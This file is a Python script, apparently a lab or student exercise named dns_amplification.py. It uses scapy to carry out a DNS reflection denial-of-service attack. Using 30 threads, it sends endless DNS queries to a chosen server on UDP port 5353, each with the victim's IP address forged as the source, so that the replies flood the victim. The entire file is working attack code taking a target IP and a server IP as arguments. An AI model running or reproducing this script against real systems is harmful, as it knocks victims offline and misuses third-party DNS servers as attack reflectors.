#!usr/bin/env python
from scapy.all import *
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

n_threads = 30
stop_signal = threading.Event()


def attack(target_ip, dns_ip):
    """
    Perform the reflection attack by sending packets to the DNS server with a spoofed ip as source
    :param target_ip: the target ip address
    :param dns_ip: the dns server ip address
    """
    while not stop_signal.is_set():
        # Craft a packet to send to the dns server with the spoofed address as source
        dns = DNS(rd=1, qd=DNSQR(qname="i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof"))
        ip = IP(src=target_ip, dst=dns_ip)
        packet = ip / UDP(dport=5353) / dns
        send(packet, verbose=0)


def attack_multi_thread(target_ip, dns_ip):
    """
    Perform the attack with threads to improve the efficiency
    :param target_ip: the target ip address
    :param dns_ip: the dns server ip address
    """
    with ThreadPoolExecutor(max_workers=n_threads) as executor:
        futures = [executor.submit(attack, target_ip, dns_ip) for _ in range(n_threads)]
        try:
            for future in as_completed(futures):
                future.result()  # Pour obtenir les résultats ou gérer les exceptions
        except KeyboardInterrupt:
            print("Signal received. Stopping the attack...")
            # Les threads seront automatiquement arrêtés à la sortie du bloc with


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage : python3 dns_amplification.py <target_ip> <dns_server_ip>")
    else:
        target = sys.argv[1]
        server = sys.argv[2]
        attack_multi_thread(target, server)
